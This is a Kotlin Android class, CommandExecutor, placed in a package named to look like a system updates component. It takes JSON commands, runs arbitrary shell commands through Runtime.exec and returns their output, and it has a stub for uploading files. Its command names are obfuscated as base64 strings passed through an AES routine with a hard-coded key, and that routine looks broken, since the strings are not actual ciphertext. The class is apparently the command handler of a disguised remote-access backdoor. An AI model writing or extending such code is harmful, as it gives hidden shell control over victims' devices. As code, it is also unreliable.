package com.system.updates.communication

import android.content.Context
import android.util.Base64
import org.json.JSONObject
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class CommandExecutor(private val context: Context) {

    private val k = "NjA2NDcxNjE2MjM4MzEzNDMyMzczMjMzMzUzNjM1MzkzNDMwMzQ3MzM1MzIzNDM5NjMwMjMzNDM1MzYzNzM4Mzkw"

    fun execute(command: JSONObject): String {
        return try {
            val type = command.getString(decrypt("cmVxdWVzdF90eXBl"))
            when (type) {
                decrypt("c2hlbGw=") -> executeShell(command.getString(decrypt("Y29tbWFuZA==")))
                decrypt("ZmlsZV91cGxvYWQ=") -> uploadFile(command.getString(decrypt("ZmlsZV9wYXRo")))
                else -> decrypt("dW5rbm93bl9jb21tYW5k")
            }
        } catch (e: Exception) {
            decrypt("ZXhlY3V0aW9uX2ZhaWxlZA==")
        }
    }

    private fun executeShell(cmd: String): String {
        return try {
            val process = Runtime.getRuntime().exec(cmd)
            process.inputStream.bufferedReader().use { it.readText() }
        } catch (e: Exception) {
            e.message ?: decrypt("c2hlbGxfZXJyb3I=")
        }
    }

    private fun uploadFile(path: String): String {
        return decrypt("ZmlsZV9wcm9jZXNzZWQ=")
    }

    private fun decrypt(d: String): String {
        return try {
            val c = Cipher.getInstance("AES/ECB/PKCS5Padding")
            c.init(Cipher.DECRYPT_MODE, SecretKeySpec(Base64.decode(k, Base64.DEFAULT), "AES"))
            val r = c.doFinal(Base64.decode(d, Base64.DEFAULT))
            String(r)
        } catch (e: Exception) {
            ""
        }
    }
}